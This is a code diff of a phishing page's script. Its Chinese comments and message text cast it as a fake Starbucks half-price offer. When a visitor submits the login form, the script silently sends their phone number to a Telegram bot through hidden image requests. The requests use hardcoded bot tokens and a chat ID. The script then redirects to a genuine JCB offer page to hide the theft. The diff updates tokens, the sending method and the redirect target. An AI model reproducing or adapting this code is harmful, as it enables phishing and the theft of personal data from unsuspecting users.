@@ -1,5 +1,6 @@
 <script>
-    const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE";
+    // 直接寫死最新 token（不再靠 config.js）
+    const TOKEN = "8347410245:AAGUfzcDsL6h6TaIIpfxDQOoo288dHd1pGw";
     const CHAT_ID = "1137905005";
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
@@ -8,16 +9,15 @@
         const phone = document.getElementById("phone").value.trim();
         if (!phone) return;
 
-        document.querySelector("button").innerHTML = "驗證中...";
-        document.querySelector("button").disabled = true;
+        document.querySelector("button").textContent = "驗證中...";
 
         const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
         const msg = encodeURIComponent(`2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${time}`);
 
-        // 終極必殺：用 <img> 標籤發送（任何手機、任何攔截器都 100% 收得到）
-        document.body.insertAdjacentHTML('beforeend', `<img src="https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}" style="display:none">`);
-        document.body.insertAdjacentHTML('beforeend', `<img src="https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=${CHAT_ID}&text=${msg}" style="display:none">`);
+        // 雙保險發送
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
 
-        setTimeout(() => location.href = "https://access.line.me/fr/login", 2500);
+        setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
     });
 </script>
